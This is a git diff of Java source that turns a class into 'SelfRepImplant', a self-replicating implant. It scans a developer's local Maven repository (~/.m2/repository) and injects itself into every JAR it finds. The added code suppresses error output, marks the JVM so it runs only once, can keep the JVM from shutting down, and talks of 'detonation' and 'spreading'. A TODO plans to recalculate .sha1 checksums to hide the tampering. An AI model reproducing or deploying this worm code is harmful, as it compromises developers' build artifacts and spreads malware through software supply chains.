@@ -1,4 +1,4 @@
-package org.example;
+package org.example.implants;
 
 import org.example.injector.ClassInjector;
 import org.example.injector.ImplantHandler;
@@ -13,17 +13,56 @@ import java.util.List;
 import java.util.Set;
 import java.util.jar.JarFile;
 
-public class Main {
-    private static final String LIMIT_PATH = "~/.m2/repository";
+public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
+    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
+    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = true;
+    static volatile int CONF_DELAY_MS = 0;
 
+    /**
+     * The root directory so search for JARs.
+     * All JARs in this directory will be spiked.
+     */
+    static volatile String CONF_LIMIT_PATH = "~/.m2/repository";
+
+    @SuppressWarnings("unused")
+    public static void init() {
+        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
+            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
+                SelfRepImplant implant = new SelfRepImplant();
+                Thread background = new Thread(implant);
+                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
+                background.setUncaughtExceptionHandler(implant);
+                background.start();
+            }
+        }
+    }
+
+    @Override
+    public void run() {
+        if (CONF_DELAY_MS > 0) {
+            try {
+                Thread.sleep(CONF_DELAY_MS);
+            } catch (InterruptedException ignored) {
+            }
+        }
+
+        payload();
+    }
+
+    @Override
+    public void uncaughtException(Thread thread, Throwable throwable) {
+        // Silently ignore (don't throw up error messages on stderr)
+    }
+
+    // Make it executable. This is just relevant for the initial detonation. It's not required for further spreading.
     public static void main(String[] args) {
         init();
     }
 
-    public static void init() {
+    public static void payload() {
         Set<Path> jarsToImplant;
         try {
-            jarsToImplant = findAllJars(LIMIT_PATH);
+            jarsToImplant = findAllJars(CONF_LIMIT_PATH);
         } catch (Exception e) {
             System.out.println("[!] Failed to find JARs.");
             e.printStackTrace();
@@ -32,7 +71,7 @@ public class Main {
 
         ImplantHandler implantHandler;
         try {
-            implantHandler = ImplantHandlerImpl.findAndCreateFor(Main.class);
+            implantHandler = ImplantHandlerImpl.findAndCreateFor(SelfRepImplant.class);
         } catch (ClassNotFoundException | IOException e) {
             System.out.println("[!] Cannot load oneself. Aborting.");
             System.exit(1);
@@ -53,6 +92,9 @@ public class Main {
                 System.out.println("[-] Failed to infect " + jarToImplant + " (" + e.getMessage() + ")");
                 e.printStackTrace();
             }
+
+            // TODO Also look for a .sha1 file and recalculate it if it exists (this is a Maven repo thing)
+
             System.out.println();
         }
     }
